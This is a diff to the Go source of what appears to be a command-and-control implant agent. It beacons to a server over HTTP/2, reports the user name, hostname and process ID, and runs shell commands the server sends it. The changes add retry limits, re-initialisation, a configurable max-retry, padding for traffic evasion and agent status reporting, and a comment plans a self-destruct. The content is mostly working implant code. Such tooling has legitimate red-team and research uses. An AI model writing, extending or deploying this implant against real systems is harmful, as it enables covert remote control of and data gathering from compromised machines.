@@ -29,12 +29,15 @@ var RUN = true
 var hostUUID = uuid.NewV4()
 var URL = "https://127.0.0.1:443/"
 var h2Client = getH2WebClient()
-var waitTime = 30000 * time.Millisecond //TODO Implement a function to change this during run time
+var waitTime = 30000 * time.Millisecond
 var agentShell = ""
 var paddingMax = 4096
 var src = rand.NewSource(time.Now().UnixNano())
-var version string
-var build string
+var version = "nonRelease"
+var build = "nonRelease"
+var maxRetry = 7
+var failedCheckin = 0
+var initial = false
 
 //Constants
 const (
@@ -53,28 +56,45 @@ func main() {
 	flag.Usage = usage
 	flag.Parse()
 
-	//Perform Initial Check in
-	initialCheckIn(URL, h2Client)
-
-	for RUN {
-		//Sleep then check in
-		if VERBOSE {
-			color.Yellow("[-]Agent version: %s", version)
-			color.Yellow("[-]Agent build: %s", build)
-			color.Yellow("[-]Sleeping for %s", waitTime.String())
-		}
-		time.Sleep(waitTime)
-		if VERBOSE {
-			color.Yellow("[-]Checking in")
-		}
-		statusCheckIn(URL, h2Client)
+	if VERBOSE {
+		color.Yellow("[-]Agent version: %s", version)
+		color.Yellow("[-]Agent build: %s", build)
 	}
 
+	for RUN {
+		if initial {
+			if VERBOSE {
+				color.Yellow("[-]Checking in")
+			}
+			statusCheckIn(URL, h2Client)
+		} else {
+			initial = initialCheckIn(URL, h2Client)
+			agentInfo(URL, h2Client)
+		}
+		if failedCheckin == maxRetry {os.Exit(1)}
+		if VERBOSE {
+			color.Yellow("[-]Sleeping for %s at %s", waitTime.String(), time.Now())
+		}
+		time.Sleep(waitTime)
+	}
 }
 
-func initialCheckIn(host string, client *http.Client) {
-	u, _ := user.Current()
-	h, _ := os.Hostname()
+func initialCheckIn(host string, client *http.Client) bool {
+	u, errU := user.Current()
+	if errU != nil{
+		if DEBUG {
+			color.Red("[!]There was an error getting the username")
+			color.Red(errU.Error())
+		}
+	}
+
+	h, errH := os.Hostname()
+	if errH != nil{
+		if DEBUG {
+			color.Red("[!]There was an error getting the hostname")
+			color.Red(errH.Error())
+		}
+	}
 
 	if VERBOSE {
 		color.Green("[+]Host Information:")
@@ -94,10 +114,17 @@ func initialCheckIn(host string, client *http.Client) {
 		UserName: u.Username,
 		UserGUID: u.Gid,
 		HostName: h,
-		Pid: os.Getpid(), // TODO get and return IP addresses
+		Pid: os.Getpid(),
 	}
 
-	payload, _ := json.Marshal(i)
+	payload, errP := json.Marshal(i)
+
+	if errP != nil {
+		if DEBUG {
+			color.Red("[!]There was an error marshaling the JSON object")
+			color.Red(errP.Error())
+		}
+	}
 
 	//JSON message to be sent to the server
 	g := messages.Base{
@@ -115,26 +142,31 @@ func initialCheckIn(host string, client *http.Client) {
 	}
 	resp, err := client.Post(host, "application/json; charset=utf-8", b)
 
-	if err != nil && DEBUG {
-		color.Red("[!]There was an error with the HTTP client while performing a POST:")
-		fmt.Println(err)
-		os.Exit(1)
-	} else if err != nil {
-		os.Exit(1)
-	}
-
-	if DEBUG {
-		color.Red("[DEBUG]HTTP Response:")
-		color.Red("[DEBUG]%s", resp)
-	}
-
-	if resp.StatusCode != 200 {
-		if VERBOSE {
-			color.Yellow("There was an error communicating with the server!")
-			color.Yellow("Recieved HTTP Status Code: %d", resp.StatusCode)
+	if err != nil {
+		failedCheckin += 1
+		if DEBUG {
+			color.Red("[!]There was an error with the HTTP client while performing a POST:")
+			color.Red(err.Error())
 		}
-		os.Exit(1)
+		if VERBOSE {color.Yellow("[-]%d out of %d total failed checkins", failedCheckin, maxRetry)}
+		return false
+	} else {
+		if DEBUG {
+			color.Red("[DEBUG]HTTP Response:")
+			color.Red("[DEBUG]%s", resp)
+		}
+		if resp.StatusCode != 200 {
+			failedCheckin += 1
+			if VERBOSE {color.Yellow("[-]%d out of %d total failed checkins", failedCheckin, maxRetry)}
+			if DEBUG {
+				color.Red("[!]There was an error communicating with the server!")
+				color.Red("[!]Received HTTP Status Code: %d", resp.StatusCode)
+			}
+			return false
+		}
 	}
+	failedCheckin = 0
+	return true
 }
 
 func statusCheckIn(host string, client *http.Client) {
@@ -155,10 +187,12 @@ func statusCheckIn(host string, client *http.Client) {
 	resp, err := client.Post(host, "application/json; charset=utf-8", b)
 
 	if err != nil {
-		if VERBOSE{
+		if DEBUG{
 			color.Red("[!]There was an error with the HTTP Response:")
 			color.Red(err.Error()) //On Mac I get "read: connection reset by peer" here but not on other platforms
 		}			      //Only does this with a 10s Sleep
+		failedCheckin += 1
+		if VERBOSE {color.Yellow("[-]%d out of %d total failed checkins", failedCheckin, maxRetry)}
 		return
 	}
 
@@ -167,6 +201,18 @@ func statusCheckIn(host string, client *http.Client) {
 		color.Red("[DEBUG]ContentLength: %d", resp.ContentLength)
 		color.Red("[DEBUG]%s", resp)
 	}
+
+	if resp.StatusCode != 200 {
+		failedCheckin += 1
+		if VERBOSE {color.Yellow("[-]%d out of %d total failed checkins", failedCheckin, maxRetry)}
+		if DEBUG {
+			color.Red("[!]There was an error communicating with the server!")
+			color.Red("[!]Received HTTP Status Code: %d", resp.StatusCode)
+		}
+		return
+	}
+
+	failedCheckin = 0
 
 	if resp.ContentLength != 0 {
 		var payload json.RawMessage
@@ -180,7 +226,7 @@ func statusCheckIn(host string, client *http.Client) {
 			color.Red("[DEBUG]Message Type: %s", j.Type)
 			color.Red("[DEBUG]Message Payload: %s", j.Payload)
 		} else if VERBOSE {
-			color.Green("%s Message Type Recieved!", j.Type)
+			color.Green("%s Message Type Received!", j.Type)
 		}
 		switch j.Type{ //TODO add self destruct that will find the .exe current path and start a new process to delete it after initial sleep
 		case "CmdPayload":
@@ -239,18 +285,45 @@ func statusCheckIn(host string, client *http.Client) {
 						color.Red(err.Error())
 					}
 				}
-				waitTime = t
-			case "padding":
-				if VERBOSE {
-					color.Yellow("[-]Setting agent message maximum padding size to %d", p.Args)
+				if t > 0 {
+					waitTime = t
+					agentInfo(host, client)
+				} else {
+					if VERBOSE {
+						color.Red("[!]The agent was provided with a time that was not greater than zero.")
+						color.Red("The provided time was: %s", t.String())
+					}
 				}
+			case "padding":
 				t, err := strconv.Atoi(p.Args)
 				if err != nil {
 					if VERBOSE {
 						color.Red("[!]There was an error changing the agent message padding size")
 					}
 				}
+				if VERBOSE {
+					color.Yellow("[-]Setting agent message maximum padding size to %d", t)
+				}
 				paddingMax = t
+				agentInfo(host, client)
+			case "initialize":
+				if VERBOSE {
+					color.Yellow("[-]Received agent re-initialize message")
+				}
+				initial = false
+			case "maxretry":
+
+				t, err := strconv.Atoi(p.Args)
+				if err != nil {
+					if VERBOSE {
+						color.Red("[!]There was an error changing the agent max retries")
+					}
+				}
+				if VERBOSE {
+					color.Yellow("[-]Setting agent max retries to %d", t)
+				}
+				maxRetry = t
+				agentInfo(host, client)
 			default:
 				if VERBOSE {
 					color.Red("[!}Unknown AgentControl message type received %s", p.Command)
@@ -288,7 +361,7 @@ func getH2WebClient() *http.Client {
 
 func executeCommand(j messages.CmdPayload) (stdout string, stderr string) {
 	if DEBUG {
-		color.Red("[DEBUG]Recieved input parameter for executeCommand function: %s", j)
+		color.Red("[DEBUG]Received input parameter for executeCommand function: %s", j)
 
 	} else if VERBOSE {
 		color.Green("Executing command %s %s %s", agentShell, j.Command, j.Args)
@@ -335,6 +408,65 @@ func RandStringBytesMaskImprSrc(n int) string {
     return string(b)
 }
 
+func agentInfo(host string, client *http.Client){
+	i := messages.AgentInfo{
+		Version: version,
+		Build: build,
+		WaitTime: waitTime.String(),
+		PaddingMax: paddingMax,
+		MaxRetry: maxRetry,
+		FailedCheckin: failedCheckin,
+	}
+
+	payload, errP := json.Marshal(i)
+
+	if errP != nil {
+		if DEBUG {
+			color.Red("[!]There was an error marshaling the JSON object")
+			color.Red(errP.Error())
+		}
+	}
+
+	g := messages.Base{
+		Version: 1.0,
+		ID:      hostUUID,
+		Type:    "AgentInfo",
+		Payload: (*json.RawMessage)(&payload),
+		Padding: RandStringBytesMaskImprSrc(paddingMax),
+	}
+
+	b := new(bytes.Buffer)
+	json.NewEncoder(b).Encode(g)
+	if VERBOSE {
+		color.Yellow("[-]Connecting to web server at %s to update agent configuration information.", host)
+	}
+	resp, err := client.Post(host, "application/json; charset=utf-8", b)
+
+	if err != nil {
+		failedCheckin += 1
+		if DEBUG {
+			color.Red("[!]There was an error with the HTTP client while performing a POST:")
+			color.Red(err.Error())
+		}
+		if VERBOSE {color.Yellow("[-]%d out of %d total failed checkins", failedCheckin, maxRetry)}
+		return
+	} else {
+		if DEBUG {
+			color.Red("[DEBUG]HTTP Response:")
+			color.Red("[DEBUG]%s", resp)
+		}
+		if resp.StatusCode != 200 {
+			failedCheckin += 1
+			if VERBOSE {color.Yellow("[-]%d out of %d total failed checkins", failedCheckin, maxRetry)}
+			if DEBUG {
+				color.Red("[!]There was an error communicating with the server!")
+				color.Red("[!]Received HTTP Status Code: %d", resp.StatusCode)
+			}
+			return
+		}
+	}
+	failedCheckin = 0
+}
 /*
 
 1. POST System Enumeration Information and receive back JSON object w/ additional instructions
@@ -346,4 +478,5 @@ func RandStringBytesMaskImprSrc(n int) string {
 */
 
 // TODO add cert stapling
-// TODO add exit after X number of failed logins
+// TODO set message jitter
+// TODO get and return IP addresses with initial checkin
